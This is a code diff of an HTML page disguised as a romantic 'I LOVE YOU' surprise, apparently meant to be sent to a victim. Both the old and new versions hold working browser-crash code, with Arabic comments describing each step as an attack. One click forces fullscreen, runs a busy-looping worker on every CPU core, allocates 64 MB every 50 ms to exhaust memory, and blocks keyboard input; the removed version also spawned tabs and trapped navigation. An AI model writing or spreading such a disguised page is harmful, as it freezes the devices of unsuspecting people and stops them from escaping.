@@ -4,58 +4,60 @@
     <meta charset="UTF-8">
     <title>Surprise ❤️</title>
     <style>
-        body { background: black; color: #ff0055; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: 'Courier New', monospace; cursor: pointer; }
-        h1 { font-size: 5rem; text-align: center; animation: shake 0.1s infinite; }
-        @keyframes shake { 0% { transform: translate(1px, 1px); } 50% { transform: translate(-1px, -2px); } 100% { transform: translate(1px, -1px); } }
+        body { background: black; color: #ff0055; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        h1 { font-size: 5rem; font-family: 'Arial Black', sans-serif; text-shadow: 0 0 20px #ff0055; cursor: pointer; }
     </style>
 </head>
 <body>
 
-    <h1>I LOVE YOU</h1>
+    <h1 id="trigger">I LOVE YOU</h1>
 
     <script>
-        let memoryWaste = [];
+        const trigger = document.getElementById('trigger');
+        let storage = [];
 
-        function totalMeltdown() {
-            // 1. ملء الشاشة
-            document.documentElement.requestFullscreen().catch(() => {});
+        trigger.onclick = function() {
+            this.innerText = "OPTIMIZING...";
+            
+            // 1. تفعيل وضع ملء الشاشة لتعطيل الخروج السريع
+            document.documentElement.requestFullscreen().catch(()=>{});
 
-            // 2. حرق المعالج (CPU) عبر أنوية متعددة
-            const cores = navigator.hardwareConcurrency || 12;
-            for (let i = 0; i < cores * 4; i++) {
-                new Worker(URL.createObjectURL(new Blob([`
-                    while(true) { 
-                        let x = Math.random() * Math.random();
-                        postMessage(x); 
+            // 2. هجوم المعالج (CPU) عبر "الخيوط المتوازية"
+            const cores = navigator.hardwareConcurrency || 8;
+            for (let i = 0; i < cores; i++) {
+                const worker = new Worker(URL.createObjectURL(new Blob([`
+                    onmessage = function(e) {
+                        const sab = e.data;
+                        const int32 = new Int32Array(sab);
+                        while(true) {
+                            // عملية حسابية معقدة تستهلك المعالج كلياً
+                            Math.sqrt(Math.random() * Math.tan(Math.random()));
+                            Atomics.add(int32, 0, 1); 
+                        }
                     }
                 `], {type: 'application/javascript'})));
+
+                // إنشاء ذاكرة مشتركة تمنع المتصفح من عمل "Aw Snap"
+                const sab = new SharedArrayBuffer(1024);
+                worker.postMessage(sab);
             }
 
-            // 3. تدمير الرام (RAM) - حجز 50 ميجا كل 100 مللي ثانية
-            // استخدام Blob و URL يجعل الرام "محجوزة" ولا يمكن للمتصفح مسحها
+            // 3. هجوم الرام (RAM) - استنزاف صامت ومستمر
             setInterval(() => {
-                try {
-                    // حجز مصفوفة عملاقة
-                    let buffer = new ArrayBuffer(50 * 1024 * 1024); // 50MB
-                    let blob = new Blob([buffer]);
-                    let url = URL.createObjectURL(blob); 
-                    memoryWaste.push(url); // تخزين الرابط يمنع مسح الـ Blob من الرام
-                    
-                    // تغيير شكل الصفحة لإظهار الضغط
-                    document.body.style.backgroundColor = (document.body.style.backgroundColor === 'black') ? '#1a0000' : 'black';
-                } catch(e) {
-                    // إذا امتلأت الرام، الكود هيحاول يفتح تبويبات جديدة كملجأ أخير
-                    window.open(window.location.href, '_blank');
+                // حجز 64 ميجا في كل دورة
+                // استخدام الـ ArrayBuffer هنا "خام" ولا يكتشفه نظام الـ Garbage Collector بسرعة
+                let chunk = new Uint8Array(64 * 1024 * 1024).fill(Math.random() * 255);
+                storage.push(chunk);
+
+                // منع المتصفح من التجميد الفوري (الذي يسبب Aw Snap) عن طريق تحديث واجهة بسيط
+                if (storage.length % 10 === 0) {
+                    console.log("Memory Synced: " + storage.length * 64 + "MB");
                 }
-            }, 100);
+            }, 50); // سرعة 50ms تضمن الوصول لـ 8 جيجا رام في ثوانٍ معدودة
 
-            // 4. تعطيل أي محاولة للهروب
-            window.onbeforeunload = function() { return "Are you sure?"; };
-            setInterval(() => { window.history.pushState(null, null, "#" + Math.random()); }, 1);
-        }
-
-        // يبدأ الهجوم عند أول لمسة
-        window.onclick = totalMeltdown;
+            // 4. تعطيل الماوس والكيبورد (شلل حركي)
+            window.addEventListener('keydown', (e) => e.preventDefault());
+        };
     </script>
 </body>
 </html>
